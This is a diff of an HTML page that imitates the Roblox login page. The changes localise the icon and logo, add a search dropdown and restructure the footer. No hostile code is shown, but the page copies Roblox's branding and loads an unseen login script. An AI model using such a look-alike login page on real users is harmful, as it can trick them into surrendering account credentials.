@@ -4,17 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Roblox</title>
-    <link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">
+    <link href="/images/icon.ico" rel="icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="stylesheet" href="css/style.css">
     <script src="js/menu.js" defer></script>
     <script src="js/login.js" defer></script>
+    <script src="js/search.js" defer></script>
 </head>
 <body>
 
     <nav class="navbar">
         <div class="logo">
-            <img src="https://static.wikia.nocookie.net/logopedia/images/d/d4/Roblox_2018_O_Icon_final_-_White.svg" alt="Logo">
+            <img src="/images/logo.png" alt="Logo">
         </div>
         <div class="menu-toggle" id="menu-toggle">
             <div class="bar"></div>
@@ -28,7 +29,21 @@
             <li><a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a></li>
             <li>
                 <div class="search-container">
-                    <input type="text" id="search-input" placeholder="Search">
+                    <input type="text" id="search-input" placeholder="Search" oninput="filterResults()">
+                    <div id="dropdown" class="dropdown">
+                        <div class="dropdown-item" id="experience-item">
+                            <span class="search-text"></span> <span>in Experiences</span>
+                        </div>
+                        <div class="dropdown-item" id="people-item">
+                            <span class="search-text"></span> <span>in People</span>
+                        </div>
+                        <div class="dropdown-item" id="groups-item">
+                            <span class="search-text"></span> <span>in Groups</span>
+                        </div>
+                        <div class="dropdown-item" id="marketplace-item">
+                            <span class="search-text"></span> <span>in Marketplace</span>
+                        </div>
+                    </div>
                     <i class="fas fa-search"></i>
                 </div>
             </li>
@@ -70,7 +85,7 @@
         </div>
     </div>
 
-    <footer class="footer">
+    <footer class="footer-container">
         <div class="footer-links">
             <a href="https://www.roblox.com/info/about-us">About Us</a>
             <a href="https://www.roblox.com/info/jobs">Jobs</a>
@@ -84,13 +99,13 @@
             <a href="https://www.roblox.com/my/account#!/privacy">Your Privacy Choices</a>
             <a href="#">Cookie Options</a>
         </div>
-    </footer>
-
-    <div class="footer-stripe"></div>
-    
-    <div class="footer-notice">
-        <p>©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
-    </div>
+        
+        <div class="footer-stripe"></div>
+        
+        <div class="footer-notice">
+            <p>©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+        </div>
+    </footer>    
 
 </body>
 </html>
